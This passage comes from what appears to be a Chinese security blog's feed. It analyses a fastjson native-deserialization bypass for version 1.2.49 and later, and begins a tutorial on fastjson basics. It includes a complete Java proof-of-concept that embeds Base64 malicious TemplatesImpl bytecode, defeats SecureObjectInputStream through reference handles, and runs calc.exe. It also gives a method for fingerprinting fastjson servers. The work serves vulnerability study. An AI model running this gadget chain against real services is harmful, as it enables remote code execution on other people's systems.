value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/853cfc82/image-20251003214419745.png" alt="image-20251003214419745"></p><p>同样跟进源码分析：<br><img src="/archives/853cfc82/image-20251003214530817.png" alt="image-20251003214530817"></p><p>这时获得的序列化器是ListSerializer类型，调用ListSerializer.write方法：</p><p><img src="/archives/853cfc82/image-20251003215324455.png" alt="image-20251003215324455"></p><p>先循环JSONArray中的list对象获取到TemplateImpl</p><p><img src="/archives/853cfc82/image-20251003221321867.png" alt="image-20251003221321867"></p><p>获取序列化器然后进行序列化</p><h2 id="fastjson-1-2-49"><a href="#fastjson-1-2-49" class="headerlink" title="fastjson&gt;&#x3D;1.2.49"></a>fastjson&gt;&#x3D;1.2.49</h2><p>依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.49<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>原来的POC切换至1.2.49版本会发生报错：<br><img src="/archives/853cfc82/image-20251004164827591.png" alt="image-20251004164827591"></p><p>在新版本中JSONArray和JSONObject都有了自己的readObject方法：</p><p>JSONArray#readObject:</p><p><img src="/archives/853cfc82/image-20251004163635349.png" alt="image-20251004163635349"></p><p>JSONObject#readObject:<br><img src="/archives/853cfc82/image-20251004163803303.png" alt="image-20251004163803303"></p><p>同时还新增了一个SecureObjectInputStream类，继承于ObjectInputStream，重写了resolveClass方法：<br><img src="/archives/853cfc82/image-20251004163952911.png" alt="image-20251004163952911"></p><p>而通过我们上面的报错可以看到是在触发readObject反序列化时引起的，最后触发resolveClass方法调用checkAutoType方法对恶意类进行检查。</p><p>所以所以我们需要阻止触发resolveClass方法，我们这里先分析一下是如何触发该方法的，在readObject处打个断点：</p><p><img src="/archives/853cfc82/image-20251004170049248.png" alt="image-20251004170049248"></p><p>首先会调用ObjectInputStream#readObject0方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">                <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                    <span class="keyword">return</span> readNull();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">                    <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                    <span class="keyword">return</span> readClass(unshared);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">                <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                    <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_STRING:</span><br><span class="line">                <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_EXCEPTION:</span><br><span class="line">                    <span class="type">IOException</span> <span class="variable">ex</span> <span class="operator">=</span> readFatalException();</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WriteAbortedException</span>(<span class="string">&quot;writing aborted&quot;</span>, ex);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">                <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                        bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                        bin.peek();             <span class="comment">// force header read</span></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(</span><br><span class="line">                            bin.currentBlockRemaining());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                            <span class="string">&quot;unexpected block data&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                            <span class="string">&quot;unexpected end of block data&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                        String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            depth--;</span><br><span class="line">            bin.setBlockDataMode(oldMode);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>其中会通过读取流中的标识判断反序列化的类型，也就常见的基本类型和引用类型，需要注意的是上面的不同case中大部分类都会最终调用readClassDesc去获取类的描述符：</p><p><img src="/archives/853cfc82/image-20251004170715353.png" alt="image-20251004170715353"></p><p>如果下一位是TC_CLASSDESC即普通类则会调用readNonProxyDesc方法：<br><img src="/archives/853cfc82/image-20251004171112249.png" alt="image-20251004171112249"></p><p>方法下会触发resolveClass方法</p><p>回到我们之前的流程，由于一开始会先反序列化BadAttributeValueExpException然后再反序列化JSONArray，由于都是普通对象，所以回转到TC_OBJECT调用<code>checkResolve(readOrdinaryObject(unshared));</code>方法读取并返回普通对象，注意readOrdinaryObject方法会调用readClassDesc方法：<br><img src="/archives/853cfc82/image-20251004174146861.png" alt="image-20251004174146861"></p><p>然后调用JSONArray的readObject方法：<br><img src="/archives/853cfc82/image-20251004172659395.png" alt="image-20251004172659395"></p><p>这里创建了一个SecureObjectInputStream实例，然后调用SecureObjectInputStream.defaultReadObject方法调用安全输入流的默认反序列化方法：</p><p><img src="/archives/853cfc82/image-20251004173438537.png" alt="image-20251004173438537"></p><p>接着会以同样的方式对ArrayList进行反序列化，而这里由于SecureObjectInputStream重写了resolveClass方法，所以会执行SecureObjectInputStream#resolveClass方法：</p><p><img src="/archives/853cfc82/image-20251004174934195.png" alt="image-20251004174934195"></p><p>然后就会调用checkAutoType对我们的恶意类进行检测然后报错</p><p>所以整体流程就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject()</span><br><span class="line">ObjectInputStream -&gt; readObject0()</span><br><span class="line">BadAttributeValueExpException -&gt; readObject()</span><br><span class="line">JSONArray -&gt; readObject()</span><br><span class="line">SecureObjectInputStream -&gt; defaultReadObject()</span><br><span class="line">ArrayList -&gt; readObject()</span><br><span class="line">ObjectInputStream -&gt; readObject1()</span><br><span class="line">ObjectInputStream -&gt; readOrdinaryObject()</span><br><span class="line">ObjectInputStream -&gt; readClassDesc()</span><br><span class="line">ObjectInputStream -&gt; readNonProxyDesc()</span><br><span class="line">SecureObjectInputStream -&gt; resolveClass()</span><br><span class="line">ParserConfig -&gt; checkAutoType()</span><br></pre></td></tr></table></figure><p>所以说到底主要的逻辑就是在反序列化时会调用resolveClass方法，正好SecureObjectInputStream重写了该方法所以就被执行了</p><p><strong>所以我们需要找到一个类正好不触发resolveClass方法，而大部分resolveClass都是通过readClassDesc执行，所以不触发readClassDesc即可</strong></p><p>而不会调用readClassDesc的分支有TC_NULL、TC_REFERENCE、TC_STRING、TC_LONGSTRING、TC_EXCEPTION，其中string与null这种对我们毫无用处的，exception类型则是解决序列化终止相关，那么就只剩下了reference引用类型了</p><p>也就是说，在JSONArray&#x2F;JSONObject对象反序列化恢复对象时，可以让我们的恶意类成为引用类型从而绕过resolveClass的检查</p><p>那么如何建立一个引用呢？</p><p>这里我们可以使用像List、map、set类型中添加同样对象即可成功利用，demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">arrayList.add(templates);</span><br><span class="line">arrayList.add(templates);</span><br><span class="line">writeObjects(arrayList);</span><br></pre></td></tr></table></figure><p>当写入对象时，会在handles哈希表中建立从对象到引用的映射</p><p>而List、map、set类型的序列化会遍历对象中的元素分别进行序列化，当List、set、map类型的对象中有两个相同类型的对象，当再次写入同一对象时，在handles这个hash表中查到了映射，那么就会通过writeHandle将重复对象以引用类型写入</p><p>所以我们的思路就是在序列化时先将templates先加入到arrayList中，后面JSONArray中再次序列化TemplatesImpl时，由于在handle这个hash表中查到了映射，后续则会以引用输出</p><p>而反序列化时ArrayList先通过readObject方法恢复TemplatesImpl对象，之后恢复BadAttributeValueExpException对象，恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray&#x2F;JSONObject对象，会触发JSONArray&#x2F;JSONObject的readObject方法，将这个过程委托给SecureObjectInputStream，在恢复JSONArray&#x2F;JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过</p><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.ListSerializer;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] codes= Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;codes&#125;);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">arrayList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        arrayList.add(templates);</span><br><span class="line">        arrayList.add(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(arrayList);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ob</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/853cfc82/image-20251004183726299.png" alt="image-20251004183726299"></p><p>HashMap一样的道理:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(<span class="string">&quot;b1uel0n3&quot;</span>,templates);</span><br><span class="line">hashMap.put(<span class="string">&quot;B1uel0n3&quot;</span>,badAttributeValueExpException);</span><br></pre></td></tr></table></figure><p>Set:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set hashset=<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">hashset.add(templates);</span><br><span class="line">hashset.add(badAttributeValueExpException);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> fastjson </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson全版本漏洞</title>
      <link href="/archives/1970b414/"/>
      <url>/archives/1970b414/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjson基础"><a href="#fastjson基础" class="headerlink" title="fastjson基础"></a>fastjson基础</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Fastjson是一个Java库，可以将Java对象转换为JSON格式，也可以将JSON字符串转换为Java对象。Fastjson可以操作任何Java对象，即使是一些预先存在的没有源码的对象。</p><h2 id="指纹特征"><a href="#指纹特征" class="headerlink" title="指纹特征"></a>指纹特征</h2><p>任意抓包，改为POST请求，格式改为<code>application/json</code>，请求体为<code>&#123;</code>不闭合，返回包会出现fastjson字样。当然也可能是无回显</p><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> age, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>将类转换为JSON</p><p>fastjson提供了JSONObject（fastJson提供的json对象）和JSONArray（fastJson提供的json数组对象）对象，JSON对象提供了toJSONString静态方法将对象转化为JSON字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test</span>(<span class="number">18</span>, <span class="string">&quot;B1uel0n3&quot;</span>);</span><br><span class="line">String json= JSON.toJSONString(test);</span><br><span class="line">System.out.println(json);</span><br><span class="line"><span class="comment">//&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;B1uel0n3&quot;&#125;</span></span><br></pre></td></tr></table></figure><p>json中主要包含对象的属性和值</p><p>toJSONString方法有若干重载方法，带有不同参数，其中常用的包括以下几个：</p><ul><li>序列化特性：com.alibaba.fastjson.serializer.SerializerFeature，可以通过设置多个特性到FastjsonConfig中全局使用，也可以在使用具体方法中指定特性。</li><li>序列化过滤器：com.alibaba.fastjson.serializer.SerializeFilter，这是一个接口，通过配置它的子接口或者实现类可以以扩展编程的方式实现定制序列化。</li><li>序列化时的配置：com.alibaba.fastjson.serializer.SerializeConfig，可以添加特点类型自定义的序列化配置。</li></ul></li><li><p>将json转化为类</p><p>JSON对象提供parse、parseObject、parseArray方法供用户进行反序列化转化成对象</p><p>区别：</p><table><thead><tr><th>方法</th><th>返回值类型</th><th>适用场景</th></tr></thead><tbody><tr><td><code>parse</code></td><td>动态类型（对象&#x2F;数组&#x2F;基本类型）</td><td>通用解析，不确定JSON结构时</td></tr><tr><td><code>parseObject</code></td><td>特定对象类型</td><td>需要强类型验证和对象映射时</td></tr><tr><td><code>parseArray</code></td><td>对象列表&#x2F;数组</td><td>处理JSON数组到对象集合时</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test newtest= JSON.parseObject(json, test.class);       System.out.println(newtest.getAge());</span><br><span class="line"><span class="comment">//18</span></span><br></pre></td></tr></table></figure><p>注意，待转换JSON对应的类需要有无参构造函数，不然转换时会报错：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>同时需要注意：在调用转换后的对象的getter方法，如果类没有定义setter方法，那就会返回默认值</p><p>猜测转换的大致流程就是：通过Class对象进行实例化，调用无参构造函数，通过setter方法设置值，这样转换后的对象就能封装有原本对象属性和对应值了</p><p>这三个方法同样有很多重载方法，带有不同参数：</p><ul><li>反序列化特性：com.alibaba.fastjson.parser.Feature</li><li>类的类型：java.lang.reflect.Type，用来执行反序列化类的类型。</li><li>处理泛型反序列化：com.alibaba.fastjson.TypeReference。</li><li>编程扩展定制反序列化：com.alibaba.fastjson.parser.deserializer.ParseProcess，例如ExtraProcessor 用于处理多余的字段，ExtraTypeProvider 用于处理多余字段时提供类型信息。</li></ul></li></ul><h2 id="JSONField注解"><a href="#JSONField注解" class="headerlink" 